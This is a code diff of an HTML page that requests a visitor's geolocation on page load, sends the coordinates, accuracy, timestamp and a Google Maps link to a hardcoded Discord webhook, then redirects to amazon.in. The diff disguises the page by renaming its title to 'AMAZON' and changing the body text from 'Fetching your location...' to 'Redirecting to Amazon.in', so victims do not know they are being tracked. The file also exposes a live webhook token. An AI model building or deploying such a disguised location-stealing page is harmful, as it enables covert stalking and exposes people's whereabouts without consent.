@@ -1,7 +1,7 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Location Tracker</title>
+    <title>AMAZON</title>
     <script>
         function getLocation() {
             if (navigator.geolocation) {
@@ -18,9 +18,9 @@
             let timestamp = new Date().toISOString();
             let redirectUrl = new URLSearchParams(window.location.search).get("redirect") || "https://www.amazon.in/";
             let webhookUrl = "https://discord.com/api/webhooks/1357393737864445992/SRNYrjE7Gfmpmqhq0sb8SqpLYdGDwN2h4d5OOeBnIm5E3wsEknuY51eCUKbdHdGz_lmo";
-
+            let mapsLink = `https://www.google.com/maps?q=${lat},${lon}`;
             let locationData = {
-                content: `New Location Logged:\nLatitude: ${lat}\nLongitude: ${lon}\nAccuracy: ${accuracy} meters\nTimestamp: ${timestamp}`
+                content: `📍 **New Location Logged:**\n- **Latitude:** ${lat}\n- **Longitude:** ${lon}\n- **Accuracy:** ${accuracy} meters\n- **Timestamp:** ${timestamp}\n- 🌍 **[View on Google Maps](${mapsLink})**`
             };
 
             fetch(webhookUrl, {
@@ -43,6 +43,6 @@
     </script>
 </head>
 <body onload="getLocation()">
-    <p>Fetching your location...</p>
+    <p>Redirecting to Amazon.in</p>
 </body>
 </html>
